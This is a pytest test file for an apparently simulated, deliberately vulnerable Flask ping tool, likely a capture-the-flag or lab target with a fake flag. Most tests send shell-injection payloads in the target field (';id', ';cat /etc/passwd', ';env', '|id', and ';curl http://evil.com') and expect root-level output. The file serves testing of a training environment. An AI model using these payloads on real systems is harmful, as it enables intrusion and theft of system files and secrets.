import pytest
from xenon.app import app


@pytest.fixture
def client():
    app.config["TESTING"] = True
    with app.test_client() as client:
        yield client


def test_ping_get(client):
    """Test GET request to ping page."""
    response = client.get("/ping")
    assert response.status_code == 200
    assert b"<form" in response.data
    assert b"input" in response.data
    assert b"Ping Tool" in response.data
    assert b"Enter IPv4 address" in response.data


def test_ping_post_empty_target(client):
    """Test POST with empty target."""
    response = client.post("/ping", data={"target": ""})
    assert response.status_code == 200
    assert b"Target address required" in response.data


def test_ping_post_valid_ipv4(client):
    """Test POST with valid IPv4 address."""
    response = client.post("/ping", data={"target": "127.0.0.1"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"64 bytes from 127.0.0.1" in response.data
    assert b"ping statistics" in response.data


def test_ping_post_valid_ipv4_different_ip(client):
    """Test POST with different valid IPv4 address."""
    response = client.post("/ping", data={"target": "192.168.1.1"})
    assert response.status_code == 200
    assert b"PING 192.168.1.1" in response.data
    assert b"64 bytes from 192.168.1.1" in response.data


def test_ping_post_ipv6_address(client):
    """Test POST with IPv6 address."""
    response = client.post("/ping", data={"target": "::1"})
    assert response.status_code == 200
    assert b"ping: connect: Network is unreachable" in response.data


def test_ping_post_ipv6_full_address(client):
    """Test POST with full IPv6 address."""
    response = client.post("/ping", data={"target": "2001:db8::1"})
    assert response.status_code == 200
    assert b"ping: connect: Network is unreachable" in response.data


def test_ping_post_domain_name(client):
    """Test POST with domain name."""
    response = client.post("/ping", data={"target": "example.com"})
    assert response.status_code == 200
    assert b"ping: Temporary failure in name resolution" in response.data


def test_ping_post_invalid_input(client):
    """Test POST with invalid input."""
    response = client.post("/ping", data={"target": "invalid-input"})
    assert response.status_code == 200
    assert b"ping: usage error: Destination address required" in response.data


def test_ping_post_command_injection_semicolon(client):
    """Test POST with semicolon command injection."""
    response = client.post("/ping", data={"target": "127.0.0.1;id"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"uid=0(root) gid=0(root) groups=0(root)" in response.data


def test_ping_post_command_injection_whoami(client):
    """Test POST with whoami command injection."""
    response = client.post("/ping", data={"target": "127.0.0.1;whoami"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"root" in response.data


def test_ping_post_command_injection_pwd(client):
    """Test POST with pwd command injection."""
    response = client.post("/ping", data={"target": "192.168.1.1;pwd"})
    assert response.status_code == 200
    assert b"PING 192.168.1.1" in response.data
    assert b"/home/xenon" in response.data


def test_ping_post_command_injection_cat_passwd(client):
    """Test POST with cat /etc/passwd command injection."""
    response = client.post("/ping", data={"target": "127.0.0.1;cat /etc/passwd"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"root:x:0:0:root:/root:/bin/bash" in response.data
    assert b"xenon:x:1000:1000:" in response.data


def test_ping_post_command_injection_ls(client):
    """Test POST with ls command injection."""
    response = client.post("/ping", data={"target": "127.0.0.1;ls"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"total 24" in response.data
    assert b".bashrc" in response.data


def test_ping_post_command_injection_uname(client):
    """Test POST with uname command injection."""
    response = client.post("/ping", data={"target": "127.0.0.1;uname -a"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"Linux xenon-server" in response.data


def test_ping_post_command_injection_ps(client):
    """Test POST with ps command injection."""
    response = client.post("/ping", data={"target": "127.0.0.1;ps aux"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"USER         PID" in response.data
    assert b"python3 app.py" in response.data


def test_ping_post_command_injection_env(client):
    """Test POST with env command injection."""
    response = client.post("/ping", data={"target": "127.0.0.1;env"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"PATH=" in response.data
    assert b"HOME=/home/xenon" in response.data


def test_ping_post_command_injection_echo(client):
    """Test POST with echo command injection."""
    response = client.post("/ping", data={"target": "127.0.0.1;echo hello"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"hello" in response.data


def test_ping_post_command_injection_unknown_command(client):
    """Test POST with unknown command injection."""
    response = client.post("/ping", data={"target": "127.0.0.1;unknowncmd"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"unknowncmd: command not found" in response.data


def test_ping_post_injection_only_semicolon(client):
    """Test POST with injection only (no IP)."""
    response = client.post("/ping", data={"target": ";id"})
    assert response.status_code == 200
    assert b"ping: usage error: Destination address required" in response.data
    assert b"uid=0(root) gid=0(root) groups=0(root)" in response.data


def test_ping_post_injection_only_invalid_ip(client):
    """Test POST with injection after invalid IP."""
    response = client.post("/ping", data={"target": "invalid;whoami"})
    assert response.status_code == 200
    assert b"ping: usage error: Destination address required" in response.data
    assert b"root" in response.data


def test_ping_post_injection_ipv6_with_command(client):
    """Test POST with IPv6 address and command injection."""
    response = client.post("/ping", data={"target": "::1;id"})
    assert response.status_code == 200
    assert b"ping: connect: Network is unreachable" in response.data
    assert b"uid=0(root) gid=0(root) groups=0(root)" in response.data


def test_ping_post_injection_domain_with_command(client):
    """Test POST with domain name and command injection."""
    response = client.post("/ping", data={"target": "example.com;whoami"})
    assert response.status_code == 200
    assert b"ping: Temporary failure in name resolution" in response.data
    assert b"root" in response.data


def test_ping_post_pipe_injection(client):
    """Test POST with pipe character injection."""
    response = client.post("/ping", data={"target": "127.0.0.1|id"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"uid=0(root) gid=0(root) groups=0(root)" in response.data


def test_ping_post_ampersand_injection(client):
    """Test POST with ampersand character injection."""
    response = client.post("/ping", data={"target": "127.0.0.1&whoami"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"root" in response.data


def test_ping_post_command_not_found(client):
    """Test POST with command injection that doesn't exist."""
    response = client.post("/ping", data={"target": "127.0.0.1;curl http://evil.com"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"curl: command not found" in response.data


def test_ping_post_flag_command(client):
    """Test POST with flag-related command injection."""
    response = client.post("/ping", data={"target": "127.0.0.1;cat flag.txt"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert b"flag{this_is_a_simulated_flag_not_real}" in response.data


def test_ping_post_date_command(client):
    """Test POST with date command injection."""
    from datetime import datetime, timezone

    now = datetime.now(timezone.utc)
    date_prefix = now.strftime("%a %b %d").encode()
    response = client.post("/ping", data={"target": "127.0.0.1;date"})
    assert response.status_code == 200
    assert b"PING 127.0.0.1" in response.data
    assert date_prefix in response.data


# Edge cases and IPv4 validation tests
def test_ping_post_edge_ipv4_addresses(client):
    """Test POST with edge case IPv4 addresses."""
    edge_cases = ["0.0.0.0", "255.255.255.255", "192.168.0.1", "10.0.0.1", "172.16.0.1"]

    for ip in edge_cases:
        response = client.post("/ping", data={"target": ip})
        assert response.status_code == 200
        assert f"PING {ip}".encode() in response.data
        assert f"64 bytes from {ip}".encode() in response.data


def test_ping_post_invalid_ipv4_addresses(client):
    """Test POST with invalid IPv4 addresses."""
    invalid_ips = ["256.1.1.1", "1.1.1", "1.1.1.1.1", "a.b.c.d", "192.168.1.-1"]

    for ip in invalid_ips:
        response = client.post("/ping", data={"target": ip})
        assert response.status_code == 200
        assert b"ping: usage error: Destination address required" in response.data
